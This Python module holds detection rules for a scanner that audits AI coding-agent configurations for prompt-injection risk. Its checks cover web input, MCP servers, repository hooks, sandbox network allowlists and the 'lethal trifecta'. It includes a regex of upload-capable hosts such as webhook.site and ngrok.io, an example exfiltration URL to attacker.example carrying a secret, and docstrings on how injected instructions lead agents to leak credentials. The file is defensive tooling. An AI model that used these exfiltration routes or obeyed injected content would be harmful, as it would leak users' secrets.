"""INPUT, EXFIL, MCP, HOOK and TRIFECTA: what comes in, what can get out, and the sum."""

from __future__ import annotations

import re
from collections.abc import Iterator

from ifinjected.agents.base import AgentReport, McpServer
from ifinjected.homes import Scope
from ifinjected.models import Confidence, Evidence, Finding, Severity, Snapshot, Status
from ifinjected.policy.model import Channel, Gate
from ifinjected.rules.engine import Registry
from ifinjected.rules.shared import GATE_WORDS, agents_found
from ifinjected.trifecta.classify import Capability, classify
from ifinjected.trifecta.verdict import Grade, Trifecta, Verdict

registry = Registry()

TRIFECTA_SOURCE = "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/"
CLAUDE_MCP = "https://code.claude.com/docs/en/mcp"
CLAUDE_SANDBOX = "https://code.claude.com/docs/en/sandboxing"
CLAUDE_HOOKS = "https://code.claude.com/docs/en/hooks"

_WRITE_HOSTS = re.compile(
    r"^(?:\*|\*\..*|(?:.*\.)?(?:github\.com|githubusercontent\.com|gitlab\.com|bitbucket\.org|"
    r"pastebin\.com|gist\.github\.com|amazonaws\.com|googleapis\.com|blob\.core\.windows\.net|"
    r"slack\.com|discord\.com|webhook\.site|ngrok\.io|ngrok-free\.app|requestbin\.com))$"
)
"""Allowed hosts that accept uploads: code hosts, paste sites, object storage, webhooks."""

_PINNED = re.compile(r"(?:@\d[\w.+-]*$|==[\w.+-]+$|@sha256:[0-9a-f]{64}$)")


def _gates(report: AgentReport) -> dict[str, Gate]:
    return dict(report.policy.mcp_gates) if report.policy else {}


def _server_finding(
    rule_id: str,
    report: AgentReport,
    server: McpServer,
    severity: Severity,
    summary: str,
    reason: str,
    action: str,
    evidence: tuple[Evidence, ...] = (),
) -> Finding:
    return Finding(
        rule_id,
        Status.WARN,
        severity,
        Confidence.HIGH,
        summary,
        reason,
        agent=report.agent,
        sources=(server.source,) if server.source else (),
        evidence=(Evidence("mcp", "server", server.name), *evidence),
        recommended_action=action,
        verify_command="ifinjected agents",
    )


# --- INPUT ----------------------------------------------------------------------------------


@registry.rule("IFJ-INPUT-001", "Web content comes in without approval", sources=(TRIFECTA_SOURCE,))
def web_input(snapshot: Snapshot) -> Iterator[Finding]:
    """The agent's web tools run without approval, so any page an injected instruction
    names comes into its context, and with it the next instruction."""
    for report in agents_found(snapshot):
        policy = report.policy
        if policy is None:
            continue
        open_tools = [
            name
            for name, gate in (("web fetch", policy.web_fetch), ("web search", policy.web_search))
            if gate is Gate.NONE
        ]
        if open_tools:
            yield Finding(
                "IFJ-INPUT-001",
                Status.WARN,
                Severity.MEDIUM,
                Confidence.HIGH,
                f"{report.agent.display_name}'s {' and '.join(open_tools)} "
                + ("runs" if len(open_tools) == 1 else "run")
                + " without approval",
                "Web pages anyone can write come into the agent's context unasked.",
                agent=report.agent,
                recommended_action="Allow web fetches only for the domains you need "
                "(Claude Code: WebFetch(domain:docs.example.org)).",
                verify_command="ifinjected agents",
            )


@registry.rule(
    "IFJ-INPUT-002", "An MCP server brings in content others write", sources=(TRIFECTA_SOURCE,)
)
def mcp_input(snapshot: Snapshot) -> Iterator[Finding]:
    """An MCP server feeds the agent content that other people write: GitHub issues and
    pull requests, web pages, chat messages, error reports. Any of it can carry
    instructions the agent may follow."""
    for report in agents_found(snapshot):
        gates = _gates(report)
        for server in report.mcp_servers:
            if server.name not in gates:
                continue
            classification = classify(server)
            if not classification.has(Capability.UNTRUSTED_INPUT):
                continue
            gate = gates[server.name]
            yield _server_finding(
                "IFJ-INPUT-002",
                report,
                server,
                Severity.MEDIUM,
                f"MCP server {server.name} brings content others write into "
                f"{report.agent.display_name}",
                (classification.entry.note if classification.entry else "")
                + f" Its tools run {GATE_WORDS[gate]}.",
                "Keep servers that read public content in agents that cannot reach your "
                "credentials, or require approval for their tools.",
            )


@registry.rule(
    "IFJ-INPUT-003",
    "The repository can start code in the agent",
    sources=(CLAUDE_MCP, CLAUDE_HOOKS),
)
def repository_code(snapshot: Snapshot) -> Iterator[Finding]:
    """Hooks and MCP servers configured *in the repository* (``.claude/settings.json``,
    ``.mcp.json``) run on your machine with your access when the agent starts there. A
    cloned repository, or a pull request that edits these files, can run its own code
    without the agent being injected at all."""
    for report in agents_found(snapshot):
        for hook in report.hooks:
            if hook.scope in {Scope.PROJECT, Scope.LOCAL}:
                yield Finding(
                    "IFJ-INPUT-003",
                    Status.WARN,
                    Severity.HIGH,
                    Confidence.HIGH,
                    f"The repository configures a {hook.event} hook for "
                    f"{report.agent.display_name}: {hook.program}",
                    "A hook from the repository runs with your full access.",
                    agent=report.agent,
                    sources=(hook.source,) if hook.source else (),
                    recommended_action=(
                        "Review the repository's hooks before trusting the workspace."
                    ),
                    verify_command="ifinjected agents",
                )
        for server in report.mcp_servers:
            if server.scope is Scope.PROJECT and server.approved is True and classify(server).local:
                yield _server_finding(
                    "IFJ-INPUT-003",
                    report,
                    server,
                    Severity.HIGH,
                    f"The repository starts MCP server {server.name} in "
                    f"{report.agent.display_name}",
                    "It was approved for this workspace and starts with your full access.",
                    "Approve project MCP servers one by one rather than with "
                    "enableAllProjectMcpServers.",
                )


# --- EXFIL ----------------------------------------------------------------------------------


@registry.rule("IFJ-EXFIL-001", "Shell commands can reach any host", sources=(CLAUDE_SANDBOX,))
def open_network(snapshot: Snapshot) -> Iterator[Finding]:
    """Shell commands run outside any sandbox, so ``curl``, ``git push`` or a script can
    send data to any host on the internet."""
    for report in agents_found(snapshot):
        policy = report.policy
        if policy is None:
            continue
        for channel in policy.channels:
            if channel.channel is not Channel.SHELL_ARBITRARY or channel.sandboxed:
                continue
            gate = min(channel.gate_inside, channel.gate_outside, key=list(Gate).index)
            if not gate.opens:
                continue
            yield Finding(
                "IFJ-EXFIL-001",
                Status.WARN,
                Severity.HIGH if gate is Gate.NONE else Severity.MEDIUM,
                Confidence.HIGH,
                f"{report.agent.display_name}'s shell commands can send data anywhere, "
                f"{GATE_WORDS[gate]}",
                "No sandbox limits the network of commands such as curl or git push.",
                agent=report.agent,
                recommended_action="Enable the sandbox and list only the hosts you need in "
                "sandbox.network.allowedDomains.",
                verify_command="ifinjected prove --run --network",
            )
            break


@registry.rule(
    "IFJ-EXFIL-002",
    "The sandbox lets data out to hosts that accept uploads",
    sources=(CLAUDE_SANDBOX,),
)
def upload_hosts(snapshot: Snapshot) -> Iterator[Finding]:
    """The sandbox's network allowlist includes hosts anyone can upload to: code hosts,
    paste sites, object storage, webhooks, or a wildcard. A sandboxed command can
    still push a secret to a repository or bucket the attacker controls."""
    for report in agents_found(snapshot):
        sandbox = report.policy.sandbox if report.policy else None
        if sandbox is None or not sandbox.effective:
            continue
        risky = [d for d in sandbox.allowed_domains if _WRITE_HOSTS.match(d.lower())]
        if risky:
            yield Finding(
                "IFJ-EXFIL-002",
                Status.WARN,
                Severity.MEDIUM,
                Confidence.HIGH,
                f"{report.agent.display_name}'s sandbox allows hosts that accept uploads: "
                f"{', '.join(risky)}",
                "Any repository, gist or bucket on these hosts is a way out.",
                agent=report.agent,
                evidence=tuple(Evidence("sandbox", "allowedDomains", d) for d in risky),
                recommended_action="Allow the narrowest hosts you need (a registry mirror rather "
                "than github.com), and keep credentials denied so there is nothing to push.",
                verify_command="ifinjected agents",
            )


@registry.rule(
    "IFJ-EXFIL-003", "Web fetches can carry data out without approval", sources=(TRIFECTA_SOURCE,)
)
def fetch_out(snapshot: Snapshot) -> Iterator[Finding]:
    """The agent's web fetch tool runs without approval. Data leaves in the URL: a fetch of
    ``https://attacker.example/?k=<secret>`` is an upload."""
    for report in agents_found(snapshot):
        if report.policy is not None and report.policy.web_fetch is Gate.NONE:
            yield Finding(
                "IFJ-EXFIL-003",
                Status.WARN,
                Severity.MEDIUM,
                Confidence.HIGH,
                f"{report.agent.display_name}'s web fetch tool can send data to any domain unasked",
                "A URL is enough to carry a secret out.",
                agent=report.agent,
                recommended_action="Allow WebFetch only for specific domains.",
                verify_command="ifinjected agents",
            )


@registry.rule("IFJ-EXFIL-004", "An MCP server can send data out", sources=(TRIFECTA_SOURCE,))
def mcp_out(snapshot: Snapshot) -> Iterator[Finding]:
    """An MCP server can write somewhere others can read: open an issue or a comment,
    post a message, call an API, load a URL. That is a way out for anything the agent
    has read."""
    for report in agents_found(snapshot):
        gates = _gates(report)
        for server in report.mcp_servers:
            if server.name in gates and classify(server).has(Capability.EXFILTRATION):
                gate = gates[server.name]
                yield _server_finding(
                    "IFJ-EXFIL-004",
                    report,
                    server,
                    Severity.HIGH if gate is Gate.NONE else Severity.MEDIUM,
                    f"MCP server {server.name} can send data out of {report.agent.display_name}, "
                    f"{GATE_WORDS[gate]}",
                    "Its tools write to places others can read.",
                    "Require approval for the server's write tools, or remove it from agents that "
                    "can reach credentials.",
                )


# --- MCP and HOOK ---------------------------------------------------------------------------


@registry.rule(
    "IFJ-MCP-001", "A local MCP server runs with your full access", sources=(CLAUDE_SANDBOX,)
)
def local_servers(snapshot: Snapshot) -> Iterator[Finding]:
    """A local (stdio) MCP server is a program on your machine with your rights. The
    agent's sandbox does not apply to it, and the agent's rules do not see what it does
    with files or the network."""
    for report in agents_found(snapshot):
        for server in report.mcp_servers:
            if server.approved is False:
                continue
            classification = classify(server)
            if not classification.local:
                continue
            unknown = not classification.known
            yield _server_finding(
                "IFJ-MCP-001",
                report,
                server,
                Severity.MEDIUM if unknown else Severity.LOW,
                f"MCP server {server.name} runs outside {report.agent.display_name}'s sandbox"
                + (" and is not in ifinjected's catalog" if unknown else ""),
                "It can open any file and reach any host you can.",
                "Run local servers in a container with only the mounts they need, or prefer a "
                "remote server with scoped credentials.",
            )


@registry.rule("IFJ-MCP-002", "An MCP server is downloaded unpinned at every start")
def unpinned(snapshot: Snapshot) -> Iterator[Finding]:
    """The server is started through ``npx``, ``uvx`` or ``docker run`` without a fixed
    version (or with ``@latest``), so whatever the package's newest release contains
    runs with your access the next time the agent starts. A hijacked package is a
    supply-chain attack that needs no injection."""
    for report in agents_found(snapshot):
        for server in report.mcp_servers:
            package = server.package
            if package is None or server.approved is False:
                continue
            if package.endswith("@latest") or not _PINNED.search(package):
                yield _server_finding(
                    "IFJ-MCP-002",
                    report,
                    server,
                    Severity.MEDIUM,
                    f"MCP server {server.name} runs the latest {package} at every start",
                    f"{server.program} fetches {package} without a pinned version.",
                    "Pin a version (pkg@1.2.3, pkg==1.2.3, or an image digest).",
                    (Evidence("mcp", "package", package),),
                )


@registry.rule("IFJ-MCP-003", "MCP tools run without approval", sources=(CLAUDE_MCP,))
def auto_approved(snapshot: Snapshot) -> Iterator[Finding]:
    """The server's tools run without asking (an allow rule names the server, or the
    permission mode skips prompts). Whatever the server can do, an injected instruction
    can make it do at once."""
    for report in agents_found(snapshot):
        gates = _gates(report)
        for server in report.mcp_servers:
            if gates.get(server.name) is Gate.NONE:
                yield _server_finding(
                    "IFJ-MCP-003",
                    report,
                    server,
                    Severity.MEDIUM,
                    f"{report.agent.display_name} runs MCP server {server.name}'s tools without "
                    "asking",
                    "No approval stands in front of its tools.",
                    "Allow only the server's read-only tools (mcp__server__tool) rather than all "
                    "of them.",
                )


@registry.rule(
    "IFJ-HOOK-001",
    "Hooks and helpers run outside the sandbox",
    sources=(CLAUDE_HOOKS, CLAUDE_SANDBOX),
)
def hooks(snapshot: Snapshot) -> Iterator[Finding]:
    """Hooks (commands the agent runs on events) and helpers such as ``apiKeyHelper`` run
    with your full access, outside the sandbox. They are yours to review: a hook that
    passes tool input to a shell can turn an injected tool call into a command."""
    for report in agents_found(snapshot):
        for hook in report.hooks:
            if hook.scope in {Scope.PROJECT, Scope.LOCAL}:
                continue  # reported as repository code (IFJ-INPUT-003)
            yield Finding(
                "IFJ-HOOK-001",
                Status.WARN,
                Severity.LOW,
                Confidence.HIGH,
                f"{report.agent.display_name} runs {hook.program} on {hook.event}, outside the "
                "sandbox",
                "Hooks run with your full access.",
                agent=report.agent,
                sources=(hook.source,) if hook.source else (),
                recommended_action="Make sure the hook never passes tool input to a shell.",
                verify_command="ifinjected agents",
            )


# --- TRIFECTA -------------------------------------------------------------------------------


def _legs(trifecta: Trifecta) -> tuple[Evidence, ...]:
    out = []
    for name, leg in (
        ("private data", trifecta.private),
        ("untrusted input", trifecta.input),
        ("a way out", trifecta.exfil),
    ):
        member = leg.easiest
        out.append(
            Evidence(
                "trifecta",
                name,
                f"{member.what} ({GATE_WORDS[member.gate]})" if member else "closed",
            )
        )
    return tuple(out)


@registry.rule(
    "IFJ-TRIFECTA-001", "Lethal trifecta, and nobody has to approve it", sources=(TRIFECTA_SOURCE,)
)
def full_ungated(snapshot: Snapshot) -> Iterator[Finding]:
    """The agent can reach private data, takes in content an attacker can write, and can
    send data out, and no human stands in front of any of the three. One poisoned
    README, issue or web page can make it read a credential and send it away. Close one
    leg: deny the credentials (in the sandbox, not only in rules), or remove the way out
    (sandbox network allowlist, no auto-approved upload tools)."""
    for trifecta in snapshot.trifectas:
        if trifecta.verdict is Verdict.FULL_UNGATED:
            yield Finding(
                "IFJ-TRIFECTA-001",
                Status.FAIL,
                Severity.HIGH if trifecta.grade is Grade.F else Severity.MEDIUM,
                Confidence.HIGH,
                f"{trifecta.agent.display_name}: lethal trifecta with no human in the way (grade "
                f"{trifecta.grade.value})",
                "Private data, untrusted input and a way out are all open.",
                agent=trifecta.agent,
                evidence=_legs(trifecta),
                recommended_action="Close one leg; ifinjected plan shows the smallest change.",
                verify_command="ifinjected scan",
            )


@registry.rule(
    "IFJ-TRIFECTA-002",
    "Lethal trifecta behind an approval",
    sources=(TRIFECTA_SOURCE,),
    max_status=Status.WARN,
)
def full_gated(snapshot: Snapshot) -> Iterator[Finding]:
    """All three legs are open, but a human must approve at least one step. That holds
    only while every prompt is read; an approved ``curl`` or ``git push`` after reading a
    file is all an injection needs."""
    for trifecta in snapshot.trifectas:
        if trifecta.verdict is Verdict.FULL_GATED:
            yield Finding(
                "IFJ-TRIFECTA-002",
                Status.WARN,
                Severity.MEDIUM,
                Confidence.HIGH,
                f"{trifecta.agent.display_name}: lethal trifecta behind your approval (grade "
                f"{trifecta.grade.value})",
                "Every leg is open; only a prompt stands in the way.",
                agent=trifecta.agent,
                evidence=_legs(trifecta),
                recommended_action=(
                    "Close one leg so that a careless approval cannot leak anything."
                ),
                verify_command="ifinjected scan",
            )


@registry.rule(
    "IFJ-TRIFECTA-003",
    "Two legs of the trifecta",
    sources=(TRIFECTA_SOURCE,),
    max_status=Status.WARN,
)
def two_legs(snapshot: Snapshot) -> Iterator[Finding]:
    """Two of the three legs are open. Adding one MCP server, one allow rule or one
    credential file completes the trifecta; check again after changing the agent's
    setup."""
    for trifecta in snapshot.trifectas:
        if trifecta.verdict is Verdict.TWO_LEGS:
            yield Finding(
                "IFJ-TRIFECTA-003",
                Status.WARN,
                Severity.LOW,
                Confidence.HIGH,
                f"{trifecta.agent.display_name}: two legs of the trifecta (grade "
                f"{trifecta.grade.value})",
                "One change away from a full trifecta.",
                agent=trifecta.agent,
                evidence=_legs(trifecta),
                verify_command="ifinjected scan",
            )
